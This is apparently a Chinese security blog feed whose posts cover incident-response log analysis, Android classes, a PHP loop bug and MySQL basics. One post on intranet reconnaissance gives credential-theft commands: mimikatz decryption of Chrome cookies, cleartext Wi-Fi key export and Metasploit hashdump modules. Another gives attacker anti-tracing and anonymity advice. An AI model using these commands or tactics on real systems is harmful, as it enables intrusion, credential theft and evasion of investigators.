IIS7.5：%SystemDrive%\inetpub\logs\LogFiles<br>• IIS6.0：%systemroot%\system32\logfiles\w3svc1\</p><p><strong>通过日志发现攻击</strong><br>日志是可以在记事本中打开的，因此在编辑菜单里选择查找，针对攻击者可能进行的操作，查找相关的关键词</p><ol><li>select、insert、delete,%20和 ‘ 单引号是与数据库操作相关的SQL语句，看用户是否进行了这方面的操作</li><li>.mdb：看有没有用户想下载MDB数据库</li><li>upfile、upload、file：通过这三个关键字的查找有可能找到用户挂木马，利用系统漏洞上传一些自己想用的文件</li><li>post：这是网页的响应方式即上传到服务器的一些信息，从中能找到用户上传的东西</li><li>404：没有正常响应的找不到的页面，由于用户如果危害到了网络的安全，就有可能不断的尝试，那么就很有可能出现找不到的页面</li><li>当发现几次可疑操作都是同一IP时，查找这一IP用户，他极有可能所做的所有操作都是与破坏网络安全有关的，就有可能找到蛛丝马迹</li></ol><h3 id="mysql数据库日志"><a href="#mysql数据库日志" class="headerlink" title="mysql数据库日志"></a>mysql数据库日志</h3><p>分类:</p><ol><li>错误日志</li></ol><p>主要用于定位mysql启动和运行中的一些问题，错误日志是默认开启的 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%log_error%&#x27;</span>;   #查询日志位置</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/my.cnf<span class="comment">#配置文件查询日志位置</span></span><br></pre></td></tr></table></figure><ol><li>查询日志</li></ol><p>查询日志用于记录所用的增删查改信息，由于在并发量大时会产生大量信息，所以默认是关闭的 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general_log%&#x27;</span>;#查询日志位置</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;  #开启查询日志</span><br></pre></td></tr></table></figure><ol><li>慢查询日志</li></ol><p>慢查询日志是对调试程序最有用的日志，可以通过慢查询日志找到哪些sql语句是性能瓶颈，慢查询默认记录超过10秒 的查询语句,可以精确到毫秒</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span>  <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%slow%&#x27;</span>;#查询日志位置</span><br></pre></td></tr></table></figure><ol><li>二进制日志</li></ol><p>二进制日志也叫作变更日志，主要用于记录修改数据或有可能引起数据改变的mysql语句 </p><h2 id="Linux入侵排查"><a href="#Linux入侵排查" class="headerlink" title="Linux入侵排查"></a>Linux入侵排查</h2><p><strong>入侵排查思路:</strong></p><p>攻击类型定位–&gt;时间范围–&gt;文件分析–&gt;进程分析–&gt;系统分析–&gt;日志分析–&gt;关联分析–&gt;逻辑推理–事件总结</p><p><strong>文件分析</strong> </p><p>• 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件 </p><p>• Webshell 排查与分析 </p><p>• 核心应用关联目录文件分析</p><p><strong>进程分析</strong> </p><p>• 当前活动进程 &amp; 远程连接 </p><p>• 启动进程 &amp; 计划任务 </p><p>• 进程工具分析 —— Windows：Pchunter、Linux：Chkrootkit&amp;Rkhunter</p><p><strong>系统分析</strong></p><p>• 环境变量 </p><p>• 帐号信息 </p><p>• History </p><p>• 系统配置</p><p><strong>日志分析</strong></p><p>• 操作系统日志 —— Windows: 事件查看器（eventvwr）、Linux: /var/log/ </p><p>• 应用日志分析 —— Access.log、Error.log</p><p><strong>账号安全</strong> </p><ol><li>查询特权用户（uid为0） </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;$3==0&#123;print $1&#125;&#x27;</span> /etc/passwd</span><br><span class="line">grep <span class="string">&quot;0&quot;</span> /etc/passwd</span><br></pre></td></tr></table></figure><ol start="2"><li>查询可以远程登录的帐号信息 </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br></pre></td></tr></table></figure><ol start="3"><li> 除root账号外，其他账号是否存在sudo权限，如果非管理需要，普通用户应删除sudo权限</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br></pre></td></tr></table></figure><ol start="4"><li> 将可疑及多余的账号删除或禁用 </li></ol><p><strong>历史命令</strong></p><p>查找~/.bash_history命令执行记录，主要分析是否有账户执行过恶意操作,那么我们就可以锁定这个线索，去做下一步的排查.</p><p>查看历史命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.bash_history | more</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .bash_history &gt;&gt; history.tx</span><br></pre></td></tr></table></figure><p><strong>端口</strong></p><p>使用 netstat 网络连接命令，查看服务器是否有未被授权的端口被监听，分析可疑端口、IP、PID等可疑连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat –antlp | more</span><br><span class="line">ss -antlp</span><br></pre></td></tr></table></figure><p>结合netstat查看非授权进程的文件路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">file /proc/<span class="variable">$PID</span>/exe</span><br></pre></td></tr></table></figure><p><strong>进程</strong></p><p>使用 ps 命令 和 top 命令，查看是否有异常进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br></pre></td></tr></table></figure><p>如果发现有名称不断变化的非授权进程占用大量系统CPU或内存资源时，则可能为恶意程序,再者通过肉眼分辩结合Google进一步判断是否为恶意进程.</p><p><strong>开机启动项</strong></p><p>命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list #查看启动项</span><br><span class="line">chkconfig 服务名 off  #关闭</span><br><span class="line">systemctl disable postfix.service  #centos7 </span><br><span class="line"></span><br><span class="line">/etc/rc.d/rc.local #查看用户自定义开机启动程序 </span><br><span class="line">/etc/rc.d/init   #查看Linux系统服务</span><br></pre></td></tr></table></figure><p><strong>计划任务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -l 列出某个用户cron服务的详细内容</span><br><span class="line">crontab –r 删除每个用户cron任务</span><br><span class="line">crontab –e 使用编辑器编辑当前的crontab文件</span><br></pre></td></tr></table></figure><p>cron 文件目录，查看是否存在非法定时任务脚本</p><p>/etc/crontab </p><p>/etc/cron.d </p><p>/etc/cron.daily </p><p>cron.hourly/ </p><p>cron.monthly </p><p>cron.weekly/</p><h2 id="Windows-入侵排查"><a href="#Windows-入侵排查" class="headerlink" title="Windows 入侵排查"></a>Windows 入侵排查</h2><p><strong>账号安全</strong></p><ol><li><p>查看服务器是否有弱口令，远程管理端口是否对公网开放</p></li><li><p>查看服务器是否存在可疑账号、新增账号 lusrmgr.msc</p></li><li><p>查看服务器是否存在隐藏账号、克隆账号(注册表,d盾等工具)</p></li><li><p>结合系统登陆日志，查看管理员登录时间、用户名是否存在异常 eventvwr.msc</p></li></ol><p><strong>检查异常端口</strong></p><ol><li>检查端口连接情况，是否有远程连接、可疑连接,netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED,再通过 tasklist 命令进行进程定位 tasklist | findstr “PID.</li></ol><p><strong>检查异常进程</strong></p><ol><li><p>运行”msinfo32”依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比 如进程路径、进程ID、文件创建日期、启动时间等,或者火绒剑,D盾,Process Explorer等工具进行排查</p></li><li><p><code>wmic process get caption,commandline /value &gt;&gt; tmp.txt</code>分析进程参数，可以查看每个进程执行的详细信息</p></li><li><p>观察如下可疑的进程及其子进程:</p></li><li><p>没有签名验证信息的进程</p></li><li><p>没有描述信息的进程</p></li><li><p>进程的属主</p></li><li><p>进程的路径是否合法</p></li><li><p>查看CPU或内存资源占用长时间过高的进程</p></li></ol><p><strong>检查启动项</strong></p><p>1.【开始】&gt;【所有程序】&gt;【启动】</p><p>2.msconfig，启动项</p><p>3.regedit 注册表启动项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>4.组策略，运行 gpedit.msc</p><p>5.服务自启动 运行 services.msc</p><p><strong>检查计划任务</strong></p><ol><li><p>【控制面板】&gt;【系统和安全】&gt;【管理工具】&gt;【任务计划】</p></li><li><p>在cmd中，然后输入命令 at &amp; schtasks.exe</p></li></ol><p><strong>系统信息</strong></p><p>systeminfo 查看补丁</p><p>查看可疑目录及文件信息  如家目录,最近打开的文件 运行–&gt;%UserProfile%\Recent,等个目录服务器文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓开发的常用类及用法</title>
      <link href="/posts/15360/"/>
      <url>/posts/15360/</url>
      
        <content type="html"><![CDATA[<h2 id="补充中"><a href="#补充中" class="headerlink" title="补充中~~~~~~~"></a>补充中~~~~~~~</h2><p><strong>Object类</strong></p><p>java.lang.Object</p><p>类 <code>Object</code> 是类层次结构的根类。每个类都使用 <code>Object</code> 作为超类。所有对象（包括数组）都实现这个类的方法。</p><p><strong>Class类</strong></p><p>java.lang.Object<br>   ↳     java.lang.Class</p><p><code>Class</code>是用来表示其他类的抽象，比如可以将类的类型，类的类名，类的hashcode封装成类的域，另外可以定义一些方法用以取得这些域值。如此而来，就封装了一个表示类型(type)的类。</p><p><strong>PackageManager类</strong></p><p>java.lang.Object<br>   ↳    android.content.pm.PackageManage</p><p>主要职责是管理应用程序包。 通过<code>PackageManager</code>，我们就可以获取应用程序信息，可以管理包，那么包下的一些东西便可以获取，其中可以获取应用图标和应用名称以及包名。</p><p><strong>Signature类</strong></p><p>java.lang.Object<br>   ↳java.security.SignatureSpi<br>        ↳java.security.Signature</p><p>此 Signature 类用来为应用程序提供数字签名算法功能。数字签名用于确保数字数据的验证和完整性。Signature 对象可用来生成和验证数字签名</p><p><strong>Context类</strong></p><p>java.lang.Object<br> ↳org.omg.CORBA.Context</p><p>Context翻译为中文，有：上下文、背景、环境等翻译，我们可以把Context理解成一种环境。Android应用模型是基于组件的应用设计模式，组件的运行要有一个完整的Android工程环境 ,它在加载资源、启动Activity、获取系统服务、创建View等活动中都需要参与。</p><h3 id="map集合"><a href="#map集合" class="headerlink" title="map集合"></a>map集合</h3><p>不同于列表去遍历才能确定一个元素,<code>Map</code>这种键值（key-value）映射表的数据结构，作用就是能高效通过<code>key</code>快速查找<code>value</code>（元素）</p><p><strong>HashMap类</strong>,java.util.HashMap是一个散列表，它存储的内容是键值对(key-value)映射,HashMap基于哈希表(hash table)的Map接口的实现，它并允许空值和空键</p><p><strong>TreeMap类</strong>,java.util.TreeMap是一个能比较元素大小的Map集合，会对传入的key进行了大小排序。</p><p>SortedMap接口 在遍历时严格按照Key的顺序遍历，最常用的实现类是TreeMap</p><p><strong>Cipher类</strong></p><p>java.lang.Object<br>  ↳javax.crypto.Cipher</p><p>此类为加密和解密提供密码功能</p><p><strong>log类</strong></p><p>android.util.Log</p><p>Android开发中打印自定义log.</p><p>java.security.MessageDigest</p><p>应用程序提供信息摘要算法的功能，如MD5 或SHA 算法,信息摘要是安全的单向哈希函数，它接收任意大小的数据，并输出固定长度的哈希值。</p><p> javax.crypto.Mac</p><p>MAC(消息认证码)算法是一种对称密钥加密技术，用于提供消息认证。要建立MAC过程，发送方和接收方共享对称密钥K。</p><p> <strong>javax.crypto.spec.SecretKeySpec</strong><br> <strong>javax.crypto.spec.DESKeySpec</strong><br> <strong>javax.crypto.spec.IvParameterSpec</strong></p><p><strong>java.security.spec.X509EncodedKeySpec</strong><br>**java.security.spec.RSAPublicKeySpec **</p>]]></content>
      
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用内网信息搜集</title>
      <link href="/posts/40782/"/>
      <url>/posts/40782/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows-主机"><a href="#Windows-主机" class="headerlink" title="Windows 主机"></a>Windows 主机</h2><p><strong>发现扫描</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用nmap扫描存活主机（icmp扫描）</span></span><br><span class="line">• 命令：nmap -sn -PE -n –v -oN result.txt 目标IP</span><br><span class="line">• 参数说明：-sn 不进行端口扫描；-PE 进行icmp <span class="built_in">echo</span>扫描；-n 不进行反向解析 ；–v 输出调试信息；–oN 输出</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用nmap扫描存活主机（arp扫描）</span></span><br><span class="line">• 命令：nmap -sn -PR -n –v 目标IP</span><br><span class="line">• 参数说明：-PR代表arp扫描，在内网中arp扫描速度最快而且准确率较高</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用netdiscover扫描（一个arp扫描工具，既可以主动扫描也可以被动嗅探）</span></span><br><span class="line">• netdiscover -i eth0 -r 目标IP</span><br><span class="line">• 参数说明：-i：指定一个接口；-r：指定扫描范围</span><br><span class="line">• 注意：netdiscover时间越久越精确，可以发现某一台主机在一段时间内介入了那些网段，从而发现其他新的网段地址</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用nbtscan工具进行快速扫描存活PC端，同时获得NETBIOS</span></span><br><span class="line">• 命令： nbtscan -r 目标IP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#扫探测目标开放端口</span></span><br><span class="line">• nmap探测：nmap -Pn -n 目标IP地址</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#masscan扫描</span></span><br><span class="line">• masscan –p 端口号 目标IP地址 --rate=10000 <span class="comment">#用10kpps的速度扫描网络端口</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#探测目标操作系统</span></span><br><span class="line">• 使用NSE脚本： nmap --script smb-os-discovery.nse -p445 目标IP地址</span><br><span class="line">• 其中：smb-os-discovery.nse 脚本通过smb来探测操作系统版本、计算机名、工作组名、域名等等信息。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#扫描主机存在的CVE漏洞</span></span><br><span class="line">• 命令：nmap --script=vuln 目标IP地址</span><br></pre></td></tr></table></figure><p><strong>常用命令</strong></p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>net user</td><td>本机用户列表</td></tr><tr><td>net view</td><td>查询同一域内的机器列表</td></tr><tr><td>net localgroup administrators</td><td>本机管理员</td></tr><tr><td>net user /domain</td><td>查询域用户</td></tr><tr><td>net group /domain</td><td>查询域里面的工作组</td></tr><tr><td>net group “domain admins” /domain</td><td>查询域管理员用户组</td></tr><tr><td>net localgroup administrators /domain</td><td>登陆本机的域管理员</td></tr><tr><td>net localgroup administrators workgroup \user /add</td><td>域用户添加到本机</td></tr><tr><td>net group “Domain controllers”</td><td>查看域控制器</td></tr></tbody></table><p><strong>Dsquery</strong></p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>dsquery computer domainroot -limit 65535 &amp;&amp; net group “domain computers” <br> /domain</td><td>列出域中内所有机器名</td></tr><tr><td>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</td><td>列出该域内所有用户名</td></tr><tr><td>dsquery subnet</td><td>列出该域内网段划分</td></tr><tr><td>dsquery group &amp;&amp; net group /domain</td><td>列出该域内分组</td></tr><tr><td>dsquery ou</td><td>列出该域内组织单位</td></tr><tr><td>dsquery server &amp;&amp; net time /domain</td><td>列出该域内控制器</td></tr></tbody></table><p> <strong>后渗透阶段的信息收集</strong></p><ol><li><p>windows密码获取工具：</p><p>• mimikatz<br>• wce<br>• getpass<br>• QuarksPwDump<br>• reg-sam<br>• pwdump7</p></li><li><p>cmdkey：用于保存用户名和密码的凭证。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure></li></ol><p>​        当知道密码后，下次登陆就不用输入密码了,获取方式：使用netpass.exe即可得到密码</p><ol start="3"><li>获取无线网络密码<br> • 将所有无线密码都导出到指定的文件夹位置</li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan export profile interface=WLAN key=clear folder=C:\</span><br></pre></td></tr></table></figure><ol start="4"><li> 获取浏览器的cookies和存储密码（chrome为例）</li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%localappdata%\google\chrome\USERDATA\default\cookies</span><br><span class="line">%localappdata%\google\chrome\USERDATA\default\Login Data</span><br></pre></td></tr></table></figure><pre><code>chrome的用户信息保存在本地文件为 sqlite 数据库 格式</code></pre><p>  使用 mimikatz 读取内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome </span><br><span class="line">/in:%localappdata%\google\chrome\USERDATA\default\cookies /unprotect&quot;</span><br></pre></td></tr></table></figure><ol start="5"><li>smb重放攻击 DNS ARP攻击 获取密码 等</li></ol><p><strong>MSF下信息搜集</strong></p><table><thead><tr><th>模块</th><th>说明</th></tr></thead><tbody><tr><td>post/windows/gather/forensics/enum_drives</td><td>获取目标主机的磁盘分区情况</td></tr><tr><td>post/windows/gather/checkvm</td><td>判断目标主机是否为虚拟机</td></tr><tr><td>post/windows/gather/enum_services</td><td>查看开启的服务</td></tr><tr><td>post/windows/gather/enum_applications</td><td>查看安装的应用</td></tr><tr><td>post/windows/gather/enum_shares</td><td>查看共享</td></tr><tr><td>post/windows/gather/dumplinks</td><td>查看目标主机最近的操作</td></tr><tr><td>post/windows/gather/enum_patches</td><td>查看补丁信息</td></tr><tr><td>scraper</td><td>导出多个信息</td></tr></tbody></table><h2 id="Linux-主机信息搜集"><a href="#Linux-主机信息搜集" class="headerlink" title="Linux 主机信息搜集"></a>Linux 主机信息搜集</h2><p><strong>常用命令</strong></p><p>history命令</p><p>last命令</p><p>arp -vn命令</p><p>/etc/hosts文件</p><p><strong>Msf下信息搜集</strong></p><table><thead><tr><th>模块</th><th>说明</th></tr></thead><tbody><tr><td>post/linux/gather/checkvm</td><td>判断目标主机是否为虚拟机</td></tr><tr><td>post/linux/gather/enum_configs</td><td>查看配置信息</td></tr><tr><td>post/linux/gather/enum_network</td><td>查看网络</td></tr><tr><td>post/linux/gather/enum_protections</td><td>查看共享</td></tr><tr><td>post/linux/gather/enum_system</td><td>查看系统和用户信息</td></tr><tr><td>post/linux/gather/enum_users_histroy</td><td>查看目标主机最近的操作</td></tr><tr><td>post/linux/gather/hashdump</td><td>得到linux中的hash</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地安全防护</title>
      <link href="/posts/26091/"/>
      <url>/posts/26091/</url>
      
        <content type="html"><![CDATA[<p><em><strong>网络接入点匿名</strong></em></p><p>－4G上网卡配合匿名上网设备</p><p>－<em>途径节点匿名且加密</em></p><p>－<em>使用的公网服务器匿名</em></p><p><strong>工作环境与配置</strong></p><p>1：物理机 vm 卡巴斯基 VeraCrypt 禁用网卡，物理机不接入网络。此外除win自带软件再无其他软件</p><p>2：vm里安装有</p><p>（1）用win7搭建的出口网关一台</p><p>（2）攻击用的linux&amp;win机器若干台（一项目一删，不建立快照）</p><p>（3）离线存储工具包的win7一台</p><p>（4）离线处理档案的win7一台</p><p>网关和攻击机均设定在同一vlan，攻击机的DNS设置为网关的内网IP，且和物理机不互通，攻击机通过网关进出流量。</p><p>网关外接USB网卡，网卡连接4G上网设备，网卡再通过开放了局域网共享的VPN，进入到公网。</p><p>这样就可以实现攻击机开机即走VPN线路，VPN断线或者网关没有启动的话攻击机立马断线，避免出现VPN线路不稳定暴露真实IP的情况。</p><p>更重要的是出去的工具，绝对不要再回到本地再使用。</p><p><strong>云服务器配置</strong></p><p>服务器管理员账号为随机强口令且root用户不允许远程登录,使用普通用户密钥登录 su切换root账号</p><p>一项目一删</p><p><strong>隐藏和反追踪</strong></p><p>（1）修改系统语言</p><p>（2）修改系统时间</p><p>（3）机器的用户名避免出现特征</p><p>（4）如果在一个目标做完撤出后</p><p>想知道目标什么时候发现以及追查到什么程度，那可以故意在目标内网留下一组，用户名密码aaa/bbb并留下一台肉鸡的地址线索，比如肉鸡是win的，那就在3389做监听和过滤，如果监听到有aaa/bbb的尝试，就说明目标已经察觉并追查到那里，更深一步的话你还可以在不同位置，留下不同的用户名密码</p><p><strong>总结：</strong></p><p>（1）所有工作均在虚拟机进行</p><p>（2）流量统一经网关走VPN进出</p><p>（3）不同需求分配不同虚拟机</p><p>（4）文件独立</p><p>（5）工具盘全盘加密&amp;拒绝弱密码</p><p><strong>严禁：</strong></p><p>电脑不关机就离开,至少卸载加密盘</p><p>图省事物理机连VPN直接搞</p><p>账户混用</p><p>留特征值，这点多见于自写工具　黑页</p><p>密码通用，不解释。</p><p>早期信息搜集的时候用真实IP去访问</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全防护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>while mysql_fetch_array 死循环原因</title>
      <link href="/posts/19927/"/>
      <url>/posts/19927/</url>
      
        <content type="html"><![CDATA[<ul><li><p><strong>错误代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from message&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>,MYSQL_ASSOC)[<span class="string">&quot;title&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>)  <span class="comment">//死循环!</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;title:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;date:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;date&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;txet:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;txt&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>正确代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from message&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>,MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;title:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;date:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;date&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;txet:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;txt&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为条件不一样，后者每次循环先执行函数，然后将值赋予变量，然后指针后移，每次取的数据都是下一条，到最后一条数据执行完，返回的是假，所以执行完最后一条就退出循环,相当于是foreach循环,跑完了就跳出循环。而第一个，的条件是一个变量，这个变量是固定的值.</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql语句基础</title>
      <link href="/posts/49263/"/>
      <url>/posts/49263/</url>
      
        <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mariadb  <span class="comment">#启动MariaDB</span></span><br><span class="line">systemctl stop mariadb  <span class="comment">#停止MariaDB</span></span><br><span class="line">systemctl restart mariadb  <span class="comment">#重启MariaDB</span></span><br><span class="line">systemctl <span 